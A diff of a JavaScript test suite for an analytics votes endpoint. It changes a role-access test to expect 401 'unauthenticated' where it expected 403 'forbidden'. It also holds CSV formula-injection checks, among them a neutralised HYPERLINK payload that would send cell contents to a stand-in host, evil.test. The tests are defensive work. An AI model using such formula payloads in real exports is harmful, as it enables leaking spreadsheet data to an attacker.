@@ -289,11 +289,11 @@ describeIfDb('GET /api/v1/analytics/votes', () => {
     expect(res.statusCode).toBe(401);
   });
 
-  it('rejects a role without panel_access with 403', async () => {
+  it('rejects a role without panel_access with 401', async () => {
     const cookie = await loginAsSteam(NO_PANEL_STEAM);
     const res = await fetchVotes(`?from=${WINDOW_FROM}&to=${WINDOW_TO}`, cookie);
-    expect(res.statusCode).toBe(403);
-    expect(res.json()).toMatchObject({ error: 'forbidden' });
+    expect(res.statusCode).toBe(401);
+    expect(res.json()).toMatchObject({ error: 'unauthenticated' });
   });
 
   it('summarizes pass rate over the window matching a control query', async () => {
@@ -425,7 +425,7 @@ describeIfDb('GET /api/v1/analytics/votes', () => {
     expect(rows).toContain(
       `top_initiator,"'=HYPERLINK(""http://evil.test/?x=""&A1,""click"")",1/1`,
     );
-    expect(rows).toContain("pass_rate_by_map,'@SUM(1+1),1/1");
+    expect(rows).toContain(`pass_rate_by_map,"'@SUM(1+1)",1/1`);
     for (const row of rows) expect(row).not.toMatch(/(^|,)"?[=+@]/);
   });
 });
